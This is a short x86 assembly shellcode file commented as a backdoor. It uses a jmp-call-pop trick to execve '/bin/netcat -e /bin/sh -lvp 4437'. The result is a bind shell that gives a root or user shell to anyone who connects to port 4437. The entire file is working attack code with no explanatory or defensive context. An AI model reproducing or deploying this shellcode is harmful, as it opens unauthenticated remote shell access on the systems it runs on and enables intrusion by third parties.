;backdor
global _start
section .text

_start:
	jmp short forward

back:
	pop esi
	xor eax,eax
	mov byte [esi + 11],al
	mov byte [esi + 14],al
	mov byte [esi + 22],al
	mov byte [esi + 27],al
	mov byte [esi + 32],al
	mov long [esi + 33],esi
	lea ebx, [esi + 12]
	mov long [esi + 37],ebx
	lea ebx, [esi + 15]
	mov long [esi + 41],ebx
	lea ebx, [esi + 23]
	mov long [esi + 45],ebx
	lea ebx, [esi + 28]
	mov long [esi + 49],ebx
	mov long [esi + 53],eax
	mov byte al,0x0b
	mov ebx, esi
	lea ecx, [esi + 33]
	lea edx, [esi + 53]
	int 0x80
	ret

forward:
	call back
	db "/bin/netcat#-e#/bin/sh#-lvp#4437#AAAABBBBCCCCDDDDEEEEFFFF"


